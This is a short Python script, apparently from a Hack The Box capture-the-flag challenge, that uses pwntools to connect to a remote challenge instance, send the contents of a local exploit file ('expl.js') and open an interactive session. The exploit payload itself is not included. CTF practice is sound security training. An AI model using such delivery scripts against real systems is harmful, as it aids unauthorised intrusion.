from pwn import *

io = remote("docker.hackthebox.eu",30251)
f = open("expl.js","rb")
exploit = f.read()
f.close()
io.sendlineafter(": \n",exploit)
io.interactive()
